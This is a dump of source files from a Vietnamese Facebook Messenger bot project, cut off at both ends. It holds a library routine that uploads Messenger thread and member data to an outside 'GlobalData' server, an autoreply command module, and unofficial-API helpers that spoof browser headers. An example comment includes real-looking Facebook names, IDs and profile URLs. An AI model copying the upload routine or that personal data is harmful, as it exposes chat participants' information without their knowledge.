H·∫£o\",\"firstName\":\"H·∫£o\",\"vanity\":\"Lazic.Kanzu\",\"thumbSrc\":\"https://scontent.fsgn5-14.fna.fbcdn.net/v/t39.30808-1/311136459_774539707316594_357342861145224378_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=101&ccb=1-7&_nc_sid=f67be1&_nc_ohc=VQmEbyNerpUAX9SL2lL&tn=b4RbIpyEAJUl2LrC&_nc_ht=scontent.fsgn5-14.fna&oh=00_AfDzMGWK-Hw8J8Ha_uZkNgwwIqX23W89p9vPbovDSrMFVw&oe=63CD7339\",\"profileUrl\":\"https://scontent.fsgn5-14.fna.fbcdn.net/v/t39.30808-1/311136459_774539707316594_357342861145224378_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=101&ccb=1-7&_nc_sid=f67be1&_nc_ohc=VQmEbyNerpUAX9SL2lL&tn=b4RbIpyEAJUl2LrC&_nc_ht=scontent.fsgn5-14.fna&oh=00_AfDzMGWK-Hw8J8Ha_uZkNgwwIqX23W89p9vPbovDSrMFVw&oe=63CD7339\",\"gender\":\"MALE\",\"type\":\"User\",\"isFriend\":true,\"isBirthday\":false}],\"unreadCount\":38925,\"messageCount\":39857,\"timestamp\":\"1674107309307\",\"muteUntil\":null,\"isGroup\":true,\"isSubscribed\":true,\"isArchived\":false,\"folder\":\"INBOX\",\"cannotReplyReason\":null,\"eventReminders\":[],\"emoji\":\"üòè\",\"color\":\"DD8800\",\"nicknames\":{\"100001776745483\":\"[ùêáùêÜ] ‚Ä¢ Eo b·ªù su\"},\"adminIDs\":[{\"id\":\"100042817150429\"}],\"approvalMode\":true,\"approvalQueue\":[],\"reactionsMuteMode\":\"reactions_not_muted\",\"mentionsMuteMode\":\"mentions_not_muted\",\"isPinProtected\":false,\"relatedPageThread\":null,\"name\":\"[üèÜ]  ùï≥ùï∑ ‚Ä¢ ùëØùíêùíìùíäùíõùíêùíè ùëÆùíÇùíéùíäùíèùíà  [üéÆ]\",\"snippet\":\"SystemCall run (async function() {\\nSend(await Api.getThreadInfo(Data.threadID))\\n})()\",\"snippetSender\":\"100042817150429\",\"snippetAttachments\":[],\"serverTimestamp\":\"1674107309307\",\"imageSrc\":\"https://scontent.fsgn5-14.fna.fbcdn.net/v/t1.15752-9/278020824_345766417524223_6790288127531819759_n.jpg?_nc_cat=101&ccb=1-7&_nc_sid=02e273&_nc_ohc=dfuXjxOR1BUAX-SUN1x&_nc_ht=scontent.fsgn5-14.fna&oh=03_AdQkXN3hb3z4Hg0Tg-vI7ZpDdSmujnluj13uNqUSJoU9iA&oe=63F060BA\",\"isCanonicalUser\":false,\"isCanonical\":false,\"recipientsLoadable\":true,\"hasEmailParticipant\":false,\"readOnly\":false,\"canReply\":true,\"lastMessageType\":\"message\",\"lastReadTimestamp\":\"1649756873571\",\"threadType\":2,\"TimeCreate\":1674107310529,\"TimeUpdate\":1674107310529}]\n                            Type:Threads\n                            By:KanzuWakazaki\n                        **/\n                        let Time = new Date().toLocaleString(\"vi-vn\", {timeZone: \"Asia/Ho_Chi_Minh\"});\n                            return request({\n                                url: ursl + '/post',\n                                method: 'post',\n                                headers: {\n                                    'user-agent': \"Horizon/GlobalData/Client\"\n                                },\n                            formData: {\n                                Time: Time,\n                                Data: JSON.stringify(data),\n                                Type: \"Threads\",\n                                By: ctx.userID\n                            }\n                        }).then(dt => console.log(dt.body)); \n                    }\n                }\n            }\n            break;\n            case \"Get\": {\n                switch (type) {\n                    case \"Users\": {\n                        /* example\n                        Requires:[5011501735554963]\n                        Type:Threads\n                        **/\n\n                        //still operating until Feb 25\n                        return request({\n                            url: ursl + '/get',\n                                method: 'post',\n                                headers: {\n                                    'user-agent': \"Horizon/GlobalData/Client\"\n                                },\n                            formData: {\n                                Requires: JSON.stringify(data),\n                                Type: \"Users\"\n                            }\n                        }).then(dt => console.log(dt.body)); \n                    }\n                    case \"Threads\": {\n                        return request({\n                            url: ursl + '/get',\n                                method: 'post',\n                                headers: {\n                                    'user-agent': \"Horizon/GlobalData/Client\"\n                                },\n                            formData: {\n                                Requires: JSON.stringify(data),\n                                Type: \"Threads\"\n                            }\n                        }).then(dt => console.log(dt.body)); \n                    }\n                }\n            }\n            break;\n                default: \n            return;\n        }\n        \n    return returnPromise;\n    };\n};","path":null,"size_bytes":8035,"size_tokens":null},"modules/commands/autoreply.js":{"content":"const fs = require(\"fs\");\nconst path = __dirname + \"/data/autoreply/autoreply.json\";\nconst cooldowns = {};\nconst { downloadFile } = require(\"../../utils/index\");\n\nmodule.exports.config = {\n    name: \"autoreply\",\n    version: \"1.1.0\",\n    hasPermssion: 0,\n    credits: \"TatsuYTB\",\n    description: \"Thi·∫øt l·∫≠p t·ª± ƒë·ªông tr·∫£ l·ªùi tin nh·∫Øn cho t·ª´ng nh√≥m, h·ªó tr·ª£ h√¨nh ·∫£nh v√† video\",\n    commandCategory: \"Qu·∫£n L√≠ Box\",\n    usages: \"[add|addvideo|addimage|list] [T·ª´ Kh√≥a] | [Bot Tr·∫£ L·ªùi]\",\n    cooldowns: 5\n};\n\nmodule.exports.onLoad = () => {\n    const dataDir = __dirname + \"/data/autoreply\";\n    if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir);\n    if (!fs.existsSync(path)) fs.writeFileSync(path, JSON.stringify({}));\n};\n\nconst getFileExtension = (url, type) => {\n    if (type === \"photo\") return \".jpg\";\n    if (type === \"video\") return \".mp4\";\n    const ext = url.split(\".\").pop();\n    return `.${ext}`;\n};\n\nconst getUniqueFileName = (type, id, extension) => {\n    const timestamp = Date.now();\n    return `${type}-${id}-${timestamp}${extension}`;\n};\n\nconst countKeywordsByType = (data, threadID, senderID, type) => {\n    if (!data[threadID]) return 0;\n    return Object.values(data[threadID]).filter(k => k.senderID === senderID && k.type === type).length;\n};\n\nmodule.exports.handleEvent = async function ({ api, event }) {\n    const { threadID, body, messageID } = event;\n    if (!body) return;\n\n    const currentTime = Date.now();\n    if (cooldowns[threadID] && currentTime - cooldowns[threadID] < 5000) return;\n\n    let data = JSON.parse(fs.readFileSync(path));\n    if (data[threadID] && data[threadID][body]) {\n        const replyData = data[threadID][body];\n        if (replyData.type === \"text\") {\n            api.sendMessage(replyData.content, threadID, messageID);\n        } else if (replyData.type === \"image\" || replyData.type === \"video\") {\n            if (!fs.existsSync(replyData.path)) {\n                return api.sendMessage(\"‚ö†Ô∏è T·ªáp ƒë√≠nh k√®m kh√¥ng t·ªìn t·∫°i ho·∫∑c ƒë√£ b·ªã x√≥a.\", threadID, messageID);\n            }\n            api.sendMessage({\n                body: replyData.content || \"\",\n                attachment: fs.createReadStream(replyData.path)\n            }, threadID, messageID);\n        }\n        cooldowns[threadID] = currentTime;\n    }\n};\n\nmodule.exports.handleReply = async function ({ api, event, handleReply }) {\n    if (handleReply.type !== \"delList\") return;\n\n    const { threadID, messageID, senderID, body } = event;\n    if (senderID !== handleReply.author) return;\n\n    let data = JSON.parse(fs.readFileSync(path));\n    const indexes = body.split(\",\").map(n => parseInt(n.trim())).filter(n => !isNaN(n));\n    let deleted = [];\n\n    indexes.forEach(i => {\n        const key = handleReply.keys[i - 1];\n        if (key && data[threadID] && data[threadID][key]) {\n            const replyData = data[threadID][key];\n            if (replyData.type === \"image\" || replyData.type === \"video\") {\n                if (fs.existsSync(replyData.path)) {\n                    try { fs.unlinkSync(replyData.path); } catch {}\n                }\n            }\n            delete data[threadID][key];\n            deleted.push(key);\n        }\n    });\n\n    fs.writeFileSync(path, JSON.stringify(data, null, 2));\n    api.sendMessage(\n        deleted.length > 0\n            ? `‚úÖ ƒê√£ x√≥a c√°c t·ª´ kh√≥a: ${deleted.join(\", \")}`\n            : \"‚ùå Kh√¥ng c√≥ t·ª´ kh√≥a h·ª£p l·ªá ƒë·ªÉ x√≥a.\",\n        threadID,\n        messageID\n    );\n};\n\nmodule.exports.run = async function ({ api, event, args }) {\n    const { threadID, messageID, senderID, messageReply } = event;\n    let data = JSON.parse(fs.readFileSync(path));\n    const action = args[0] ? args[0].toLowerCase() : \"\";\n    const input = args.join(\" \").slice(action.length).trim();\n\n    switch (action) {\n        case \"add\":\n        case \"addvideo\":\n        case \"addimage\": {\n            const [key, reply] = input.split(\" | \").map(item => item?.trim());\n            if (!key) return api.sendMessage(\"Vui l√≤ng nh·∫≠p t·ª´ kh√≥a.\", threadID, messageID);\n            if (action === \"add\" && (!reply || reply.length === 0))\n                return api.sendMessage(\"Vui l√≤ng nh·∫≠p c√∫ ph√°p: t·ª´ kh√≥a | n·ªôi dung\", threadID, messageID);\n\n            let isFile = false, attachment = null;\n            if ((action === \"addvideo\" || action === \"addimage\") && messageReply?.attachments?.length > 0) {\n                isFile = true;\n                attachment = messageReply.attachments[0];\n                if (action === \"addvideo\" && attachment.type !== \"video\")\n                    return api.sendMessage(\"T·ªáp ƒë√≠nh k√®m kh√¥ng ph·∫£i video.\", threadID, messageID);\n                if (action === \"addimage\" && attachment.type !== \"photo\")\n                    return api.sendMessage(\"T·ªáp ƒë√≠nh k√®m kh√¥ng ph·∫£i h√¨nh ·∫£nh.\", threadID, messageID);\n            }\n            if ((action === \"addvideo\" || action === \"addimage\") && !attachment)\n                return api.sendMessage(\"Vui l√≤ng reply k√®m m·ªôt t·ªáp ƒë√≠nh k√®m ph√π h·ª£p.\", threadID, messageID);\n\n            if (!data[threadID]) data[threadID] = {};\n            const textCount = countKeywordsByType(data, threadID, senderID, \"text\");\n            const imageCount = countKeywordsByType(data, threadID, senderID, \"image\");\n            const videoCount = countKeywordsByType(data, threadID, senderID, \"video\");\n\n            if (action === \"add\" && textCount >= 10) return api.sendMessage(\"B·∫°n ƒë√£ ƒë·∫°t gi·ªõi h·∫°n 10 t·ª´ kh√≥a g·ª≠i vƒÉn b·∫£n.\", threadID, messageID);\n            if (action === \"addimage\" && imageCount >= 5) return api.sendMessage(\"B·∫°n ƒë√£ ƒë·∫°t gi·ªõi h·∫°n 5 t·ª´ kh√≥a g·ª≠i h√¨nh ·∫£nh.\", threadID, messageID);\n            if (action === \"addvideo\" && videoCount >= 3) return api.sendMessage(\"B·∫°n ƒë√£ ƒë·∫°t gi·ªõi h·∫°n 3 t·ª´ kh√≥a g·ª≠i video.\", threadID, messageID);\n\n            const extension = isFile ? getFileExtension(attachment.url, attachment.type) : null;\n            const uniqueFileName = isFile ? getUniqueFileName(attachment.type, attachment.id, extension) : null;\n            const filePath = isFile ? `${__dirname}/data/autoreply/${uniqueFileName}` : null;\n\n            data[threadID][key] = {\n                type: isFile ? (attachment.type === \"video\" ? \"video\" : \"image\") : \"text\",\n                content: reply || \"\",\n                path: filePath,\n                senderID: senderID\n            };\n\n            if (isFile) {\n                try {\n                    await downloadFile(attachment.url, filePath);\n                    fs.writeFileSync(path, JSON.stringify(data, null, 2));\n                    return api.sendMessage(`ƒê√£ th√™m t·ª´ kh√≥a \"${key}\" k√®m ${attachment.type === \"video\" ? \"video\" : \"·∫£nh\"}.`, threadID, messageID);\n                } catch (err) {\n                    console.error(err);\n                    return api.sendMessage(\"ƒê√£ x·∫£y ra l·ªói khi l∆∞u file.\", threadID, messageID);\n                }\n            } else {\n                fs.writeFileSync(path, JSON.stringify(data, null, 2));\n                return api.sendMessage(`ƒê√£ th√™m t·ª´ kh√≥a \"${key}\".`, threadID, messageID);\n            }\n        }\n\n        case \"list\": {\n            if (!data[threadID] || Object.keys(data[threadID]).length === 0)\n                return api.sendMessage(\"Hi·ªán kh√¥ng c√≥ t·ª´ kh√≥a n√†o ƒë∆∞·ª£c thi·∫øt l·∫≠p.\", threadID, messageID);\n\n            let listMessage = \"üìå Danh s√°ch t·ª´ kh√≥a:\\n\";\n            const keys = Object.keys(data[threadID]);\n            keys.forEach((key, index) => {\n                const replyData = data[threadID][key];\n                const typeInfo = replyData.type === \"text\" ? \"VƒÉn b·∫£n\" : replyData.type === \"image\" ? \"·∫¢nh\" : \"Video\";\n                listMessage += `${index + 1}. ${key} (${typeInfo}) ‚ûù ${replyData.content || \"[Kh√¥ng c√≥ n·ªôi dung]\"}\\n`;\n            });\n            listMessage += \"\\nüëâ Reply tin nh·∫Øn n√†y v·ªõi s·ªë th·ª© t·ª± (vd: 1 ho·∫∑c 1,2,3) ƒë·ªÉ x√≥a t·ª´ kh√≥a.\";\n\n            return api.sendMessage(listMessage, threadID, (err, info) => {\n                if (err) return;\n                global.client.handleReply.push({\n                    type: \"delList\",\n                    name: this.config.name,\n                    author: senderID,\n                    messageID: info.messageID,\n                    keys\n                });\n            }, messageID);\n        }\n\n        default:\n            api.sendMessage(\n                \">H∆∞·ªõng D·∫´n<\\n\"\n                + \"ADD: #autoreply add [T·ª´ Kh√≥a] | [Bot Tr·∫£ L·ªùi]\\n\"\n                + \"ADDVIDEO: #autoreply addvideo [T·ª´ Kh√≥a] | [N·ªôi Dung] (reply k√®m video)\\n\"\n                + \"ADDIMAGE: #autoreply addimage [T·ª´ Kh√≥a] | [N·ªôi Dung] (reply k√®m ·∫£nh)\\n\\n\"\n                + \"LIST: #autoreply list\\n\",\n                threadID, messageID\n            );\n    }\n};\n","path":null,"size_bytes":8913,"size_tokens":null},"lib/fca-auto/utils.js":{"content":"// @ts-nocheck\n/* eslint-disable no-undef */\n\n/* eslint-disable no-prototype-builtins */\n\n\"use strict\";\nvar url = require(\"url\");\nvar log = require(\"npmlog\");\nvar stream = require(\"stream\");\nvar bluebird = require(\"bluebird\");\nvar querystring = require(\"querystring\");\nvar request = bluebird.promisify(require(\"request\").defaults({ jar: true }));\n\n/**\n * @param {any} url\n */\n\nfunction setProxy(url) {\n    if (typeof url == \"undefined\") return request = bluebird.promisify(require(\"request\").defaults({ jar: true }));\n    return request = bluebird.promisify(require(\"request\").defaults({ jar: true, proxy: url }));\n}\n\n/**\n * @param {string | URL} url\n * @param {{ userAgent: any; }} options\n * @param {{ region: any; }} [ctx]\n * @param {undefined} [customHeader]\n */\n\nfunction getHeaders(url, options, ctx, customHeader) {\n    var headers = {\n        \"Content-Type\": \"application/x-www-form-urlencoded\",\n        Referer: \"https://www.facebook.com/\",\n        Host: url.replace(\"https://\", \"\").split(\"/\")[0],\n        Origin: \"https://www.facebook.com\",\n        \"user-agent\": (options.userAgent || \"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36\"),\n        Connection: \"keep-alive\",\n        \"sec-fetch-site\": 'same-origin',\n        \"sec-fetch-mode\": 'cors'\n    };\n    if (customHeader) Object.assign(headers, customHeader);\n    if (ctx && ctx.region) headers[\"X-MSGR-Region\"] = ctx.region;\n\n    return headers;\n}\n\n/**\n * @param {{ _read: any; _readableState: any; }} obj\n */\n\nfunction isReadableStream(obj) {\n    return (\n        obj instanceof stream.Stream &&\n        (getType(obj._read) === \"Function\" ||\n            getType(obj._read) === \"AsyncFunction\") &&\n        getType(obj._readableState) === \"Object\"\n    );\n}\n\n/**\n * @param {any} url\n * @param {any} jar\n * @param {{ [x: string]: any; fb_dtsg?: any; jazoest?: any; hasOwnProperty?: any; }} qs\n * @param {any} options\n * @param {any} ctx\n */\n\nfunction get(url, jar, qs, options, ctx) {\n    // I'm still confused about this\n    if (getType(qs) === \"Object\")\n        for (var prop in qs)\n            if (qs.hasOwnProperty(prop) && getType(qs[prop]) === \"Object\") qs[prop] = JSON.stringify(qs[prop]);\n    var op = {\n        headers: getHeaders(url, options, ctx),\n        timeout: 60000,\n        qs: qs,\n        url: url,\n        method: \"GET\",\n        jar: jar,\n        gzip: true\n    };\n\n    return request(op).then(function(res) {\n        return res;\n    });\n}\n\nfunction post(url, jar, form, options, ctx, customHeader) {\n    var op = {\n        headers: getHeaders(url, options),\n        timeout: 60000,\n        url: url,\n        method: \"POST\",\n        form: form,\n        jar: jar,\n        gzip: true\n    };\n    return request(op).then(function(res) {\n        return res;\n    });\n}\n\n/**\n * @param {any} url\n * @param {any} jar\n * @param {{ __user: any; __req: string; __rev: any; __a: number; \n// __af: siteData.features,\nfb_dtsg: any; jazoest: any; }} form\n * @param {{ __user: any; __req: string; __rev: any; __a: number; \n// __af: siteData.features,\nfb_dtsg: any; jazoest: any; }} qs\n * @param {any} options\n * @param {any} ctx\n */\n\nfunction postFormData(url, jar, form, qs, options, ctx) {\n    var headers = getHeaders(url, options, ctx);\n    headers[\"Content-Type\"] = \"multipart/form-data\";\n    var op = {\n        headers: headers,\n        timeout: 60000,\n        url: url,\n        method: \"POST\",\n        formData: form,\n        qs: qs,\n        jar: jar,\n        gzip: true\n    };\n\n    return request(op).then(function(res) {\n        return res;\n    });\n}\n\n/**\n * @param {string | number | any[]} val\n * @param {number} [len]\n */\n\nfunction padZeros(val, len) {\n    val = String(val);\n    len = len || 2;\n    while (val.length < len) val = \"0\" + val;\n    return val;\n}\n\n/**\n * @param {any} clientID\n */\n\nfunction generateThreadingID(clientID) {\n    var k = Date.now();\n    var l = Math.floor(Math.random() * 4294967295);\n    var m = clientID;\n    return \"<\" + k + \":\" + l + \"-\" + m + \"@mail.projektitan.com>\";\n}\n\n/**\n * @param {string | any[]} data\n */\n\nfunction binaryToDecimal(data) {\n    var ret = \"\";\n    while (data !== \"0\") {\n        var end = 0;\n        var fullName = \"\";\n        var i = 0;\n        for (; i < data.length; i++) {\n            end = 2 * end + parseInt(data[i], 10);\n            if (end >= 10) {\n                fullName += \"1\";\n                end -= 10;\n            } else fullName += \"0\";\n        }\n        ret = end.toString() + ret;\n        data = fullName.slice(fullName.indexOf(\"1\"));\n    }\n    return ret;\n}\n\nfunction generateOfflineThreadingID() {\n    var ret = Date.now();\n    var value = Math.floor(Math.random() * 4294967295);\n    var str = (\"0000000000000000000000\" + value.toString(2)).slice(-22);\n    var msgs = ret.toString(2) + str;\n    return binaryToDecimal(msgs);\n}\n\nvar h;\nvar i = {};\nvar j = {\n    _: \"%\",\n    A: \"%2\",\n    B: \"000\",\n    C: \"%7d\",\n    D: \"%7b%22\",\n    E: \"%2c%22\",\n    F: \"%22%3a\",\n    G: \"%2c%22ut%22%3a1\",\n    H: \"%2c%22bls%22%3a\",\n    I: \"%2c%22n%22%3a%22%\",\n    J: \"%22%3a%7b%22i%22%3a0%7d\",\n    K: \"%2c%22pt%22%3a0%2c%22vis%22%3a\",\n    L: \"%2c%22ch%22%3a%7b%22h%22%3a%22\",\n    M: \"%7b%22v%22%3a2%2c%22time%22%3a1\",\n    N: \".channel%22%2c%22sub%22%3a%5b\",\n    O: \"%2c%22sb%22%3a1%2c%22t%22%3a%5b\",\n    P: \"%2c%22ud%22%3a100%2c%22lc%22%3a0\",\n    Q: \"%5d%2c%22f%22%3anull%2c%22uct%22%3a\",\n    R: \".channel%22%2c%22sub%22%3a%5b1%5d\",\n    S: \"%22%2c%22m%22%3a0%7d%2c%7b%22i%22%3a\",\n    T: \"%2c%22blc%22%3a1%2c%22snd%22%3a1%2c%22ct%22%3a\",\n    U: \"%2c%22blc%22%3a0%2c%22snd%22%3a1%2c%22ct%22%3a\",\n    V: \"%2c%22blc%22%3a0%2c%22snd%22%3a0%2c%22ct%22%3a\",\n    W: \"%2c%22s%22%3a0%2c%22blo%22%3a0%7d%2c%22bl%22%3a%7b%22ac%22%3a\",\n    X: \"%2c%22ri%22%3a0%7d%2c%22state%22%3a%7b%22p%22%3a0%2c%22ut%22%3a1\",\n    Y: \"%2c%22pt%22%3a0%2c%22vis%22%3a1%2c%22bls%22%3a0%2c%22blc%22%3a0%2c%22snd%22%3a1%2c%22ct%22%3a\",\n    Z: \"%2c%22sb%22%3a1%2c%22t%22%3a%5b%5d%2c%22f%22%3anull%2c%22uct%22%3a0%2c%22s%22%3a0%2c%22blo%22%3a0%7d%2c%22bl%22%3a%7b%22ac%22%3a\"\n};\n(function() {\n    var l = [];\n    for (var m in j) {\n        i[j[m]] = m;\n        l.push(j[m]);\n    }\n    l.reverse();\n    h = new RegExp(l.join(\"|\"), \"g\");\n})();\n\n/**\n * @param {string | number | boolean} str\n */\n\nfunction presenceEncode(str) {\n    return encodeURIComponent(str)\n        .replace(/([_A-Z])|%../g, function(m, n) {\n            return n ? \"%\" + n.charCodeAt(0).toString(16) : m;\n        })\n        .toLowerCase()\n        .replace(h, function(m) {\n            return i[m];\n        });\n}\n\n// eslint-disable-next-line no-unused-vars\n/**\n * @param {string} str\n */\n\nfunction presenceDecode(str) {\n    return decodeURIComponent(\n        str.replace(/[_A-Z]/g, function(/** @type {string | number} */m) {\n            return j[m];\n        })\n    );\n}\n\n/**\n * @param {string} userID\n */\n\nfunction generatePresence(userID) {\n    var time = Date.now();\n    return (\n        \"E\" +\n        presenceEncode(\n            JSON.stringify({\n                v: 3,\n                time: parseInt(time / 1000, 10),\n                user: userID,\n                state: {\n                    ut: 0,\n                    t2: [],\n                    lm2: null,\n                    uct2: time,\n                    tr: null,\n                    tw: Math.floor(Math.random() * 4294967295) + 1,\n                    at: time\n                },\n                ch: {\n                    [\"p_\" + userID]: 0\n                }\n            })\n        )\n    );\n}\n\nfunction generateAccessiblityCookie() {\n    var time = Date.now();\n    return encodeURIComponent(\n        JSON.stringify({\n            sr: 0,\n            \"sr-ts\": time,\n            jk: 0,\n            \"jk-ts\": time,\n            kb: 0,\n            \"kb-ts\": time,\n            hcm: 0,\n            \"hcm-ts\": time\n        })\n    );\n}\n\nfunction getGUID() {\n    /** @type {number} */\n\n    var sectionLength = Date.now();\n    /** @type {string} */\n\n    var id = \"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx\".replace(/[xy]/g, function(c) {\n        /** @type {number} */\n\n        var r = Math.floor((sectionLength + Math.random() * 16) % 16);\n        /** @type {number} */\n\n        sectionLength = Math.floor(sectionLength / 16);\n        /** @type {string} */\n\n        var _guid = (c == \"x\" ? r : (r & 7) | 8).toString(16);\n        return _guid;\n    });\n    return id;\n}\n\n/**\n * @param {{ mercury: any; blob_attachment: any; attach_type: any; sticker_attachment: any; extensible_attachment: { story_attachment: { target: { __typename: string; }; }; }; metadata: { stickerID: { toString: () => any; }; packID: { toString: () => any; }; spriteURI: any; spriteURI2x: any; width: any; height: any; frameCount: any; frameRate: any; framesPerRow: any; framesPerCol: any; fbid: { toString: () => any; }; url: any; dimensions: { split: (arg0: string) => any[]; width: any; height: any; }; duration: any; }; url: any; name: any; fileName: any; thumbnail_url: any; preview_url: any; preview_width: any; preview_height: any; large_preview_url: any; large_preview_width: any; large_preview_height: any; share: { share_id: { toString: () => any; }; title: any; description: any; source: any; media: { image: any; image_size: { width: any; height: any; }; playable: any; duration: any; animated_image_size: any; }; subattachments: any; uri: any; target: any; style_list: any; }; }} attachment1\n * @param {{ caption?: any; description?: any; id: any; is_malicious?: any; mime_type?: any; file_size?: any; filename?: any; image_data: any; href?: any; }} [attachment2]\n */\n\nfunction _formatAttachment(attachment1, attachment2) {\n    // TODO: THIS IS REALLY BAD\n    // This is an attempt at fixing Facebook's inconsistencies. Sometimes they give us\n    // two attachment objects, but sometimes only one. They each contain part of the\n    // data that you'd want so we merge them for convenience.\n    // Instead of having a bunch of if statements guarding every access to image_data,\n    // we set it to empty object and use the fact that it'll return undefined.\n\n    attachment2 = attachment2 || { id: \"\", image_data: {} };\n    attachment1 = attachment1.mercury ? attachment1.mercury : attachment1;\n    var blob = attachment1.blob_attachment;\n    var type =\n        blob && blob.__typename ? blob.__typename : attachment1.attach_type;\n    if (!type && attachment1.sticker_attachment) {\n        type = \"StickerAttachment\";\n        blob = attachment1.sticker_attachment;\n    } else if (!type && attachment1.extensible_attachment) {\n        if (\n            attachment1.extensible_attachment.story_attachment &&\n            attachment1.extensible_attachment.story_attachment.target &&\n            attachment1.extensible_attachment.story_attachment.target.__typename &&\n            attachment1.extensible_attachment.story_attachment.target.__typename === \"MessageLocation\"\n        ) type = \"MessageLocation\";\n        else type = \"ExtensibleAttachment\";\n\n        blob = attachment1.extensible_attachment;\n    }\n    // TODO: Determine whether \"sticker\", \"photo\", \"file\" etc are still used\n    // KEEP IN SYNC WITH getThreadHistory\n    switch (type) {\n        case \"sticker\":\n            return {\n                type: \"sticker\",\n                ID: attachment1.metadata.stickerID.toString(),\n                url: attachment1.url,\n\n                packID: attachment1.metadata.packID.toString(),\n                spriteUrl: attachment1.metadata.spriteURI,\n                spriteUrl2x: attachment1.metadata.spriteURI2x,\n                width: attachment1.metadata.width,\n                height: attachment1.metadata.height,\n\n                caption: attachment2.caption,\n                description: attachment2.description,\n\n                frameCount: attachment1.metadata.frameCount,\n                frameRate: attachment1.metadata.frameRate,\n                framesPerRow: attachment1.metadata.framesPerRow,\n                framesPerCol: attachment1.metadata.framesPerCol,\n\n                stickerID: attachment1.metadata.stickerID.toString(), // @Legacy\n                spriteURI: attachment1.metadata.spriteURI, // @Legacy\n                spriteURI2x: attachment1.metadata.spriteURI2x // @Legacy\n            };\n        case \"file\":\n            return {\n                type: \"file\",\n                filename: attachment1.name,\n                ID: attachment2.id.toString(),\n                url: attachment1.url,\n\n                isMalicious: attachment2.is_malicious,\n                contentType: attachment2.mime_type,\n\n                name: attachment1.name, // @Legacy\n                mimeType: attachment2.mime_type, // @Legacy\n                fileSize: attachment2.file_size // @Legacy\n            };\n        case \"photo\":\n            return {\n                type: \"photo\",\n                ID: attachment1.metadata.fbid.toString(),\n                filename: attachment1.fileName,\n                thumbnailUrl: attachment1.thumbnail_url,\n\n                previewUrl: attachment1.preview_url,\n                previewWidth: attachment1.preview_width,\n                previewHeight: attachment1.preview_height,\n\n                largePreviewUrl: attachment1.large_preview_url,\n                largePreviewWidth: attachment1.large_preview_width,\n                largePreviewHeight: attachment1.large_preview_height,\n\n                url: attachment1.metadata.url, // @Legacy\n                width: attachment1.metadata.dimensions.split(\",\")[0], // @Legacy\n                height: attachment1.metadata.dimensions.split(\",\")[1], // @Legacy\n                name: attachment1.fileName // @Legacy\n            };\n        case \"animated_image\":\n            return {\n                type: \"animated_image\",\n                ID: attachment2.id.toString(),\n                filename: attachment2.filename,\n\n                previewUrl: attachment1.preview_url,\n                previewWidth: attachment1.preview_width,\n                previewHeight: attachment1.preview_height,\n\n                url: attachment2.image_data.url,\n                width: attachment2.image_data.width,\n                height: attachment2.image_data.height,\n\n                name: attachment1.name, // @Legacy\n                facebookUrl: attachment1.url, // @Legacy\n                thumbnailUrl: attachment1.thumbnail_url, // @Legacy\n                mimeType: attachment2.mime_type, // @Legacy\n                rawGifImage: attachment2.image_data.raw_gif_image, // @Legacy\n                rawWebpImage: attachment2.image_data.raw_webp_image, // @Legacy\n                animatedGifUrl: attachment2.image_data.animated_gif_url, // @Legacy\n                animatedGifPreviewUrl: attachment2.image_data.animated_gif_preview_url, // @Legacy\n                animatedWebpUrl: attachment2.image_data.animated_webp_url, // @Legacy\n                animatedWebpPreviewUrl: attachment2.image_data.animated_webp_preview_url // @Legacy\n            };\n        case \"share\":\n            return {\n                type: \"share\",\n                ID: attachment1.share.share_id.toString(),\n                url: attachment2.href,\n\n                title: attachment1.share.title,\n                description: attachment1.share.description,\n                source: attachment1.share.source,\n\n                image: attachment1.share.media.image,\n                width: attachment1.share.media.image_size.width,\n                height: attachment1.share.media.image_size.height,\n                playable: attachment1.share.media.playable,\n                duration: attachment1.share.media.duration,\n\n                subattachments: attachment1.share.subattachments,\n                properties: {},\n\n                animatedImageSize: attachment1.share.media.animated_image_size, // @Legacy\n                facebookUrl: attachment1.share.uri, // @Legacy\n                target: attachment1.share.target, // @Legacy\n                styleList: attachment1.share.style_list // @Legacy\n            };\n        case \"video\":\n            return {\n                type: \"video\",\n                ID: attachment1.metadata.fbid.toString(),\n                filename: attachment1.name,\n\n                previewUrl: attachment1.preview_url,\n                previewWidth: attachment1.preview_width,\n                previewHeight: attachment1.preview_height,\n\n                url: attachment1.url,\n                width: attachment1.metadata.dimensions.width,\n                height: attachment1.metadata.dimensions.height,\n\n                duration: attachment1.metadata.duration,\n                videoType: \"unknown\",\n\n                thumbnailUrl: attachment1.thumbnail_url // @Legacy\n            };\n        case \"error\":\n            return {\n                type: \"error\",\n\n                // Save error attachments because we're unsure of their format,\n                // and whether there are cases they contain something useful for debugging.\n                attachment1: attachment1,\n                attachment2: attachment2\n            };\n        case \"MessageImage\":\n            return {\n                type: \"photo\",\n                ID: blob.legacy_attachment_id,\n                filename: blob.filename,\n                thumbnailUrl: blob.thumbnail.uri,\n\n                previewUrl: blob.preview.uri,\n                previewWidth: blob.preview.width,\n                previewHeight: blob.preview.height,\n\n                largePreviewUrl: blob.large_preview.uri,\n                largePreviewWidth: blob.large_preview.width,\n                largePreviewHeight: blob.large_preview.height,\n\n                url: blob.large_preview.uri, // @Legacy\n                width: blob.original_dimensions.x, // @Legacy\n                height: blob.original_dimensions.y, // @Legacy\n                name: blob.filename // @Legacy\n            };\n        case \"MessageAnimatedImage\":\n            return {\n                type: \"animated_image\",\n                ID: blob.legacy_attachment_id,\n                filename: blob.filename,\n\n                previewUrl: blob.preview_image.uri,\n                previewWidth: blob.preview_image.width,\n                previewHeight: blob.preview_image.height,\n\n                url: blob.animated_image.uri,\n                width: blob.animated_image.width,\n                height: blob.animated_image.height,\n\n                thumbnailUrl: blob.preview_image.uri, // @Legacy\n                name: blob.filename, // @Legacy\n                facebookUrl: blob.animated_image.uri, // @Legacy\n                rawGifImage: blob.animated_image.uri, // @Legacy\n                animatedGifUrl: blob.animated_image.uri, // @Legacy\n                animatedGifPreviewUrl: blob.preview_image.uri, // @Legacy\n                animatedWebpUrl: blob.animated_image.uri, // @Legacy\n                animatedWebpPreviewUrl: blob.preview_image.uri // @Legacy\n            };\n        case \"MessageVideo\":\n            return {\n                type: \"video\",\n                filename: blob.filename,\n                ID: blob.legacy_attachment_id,\n\n                previewUrl: blob.large_image.uri,\n                previewWidth: blob.large_image.width,\n                previewHeight: 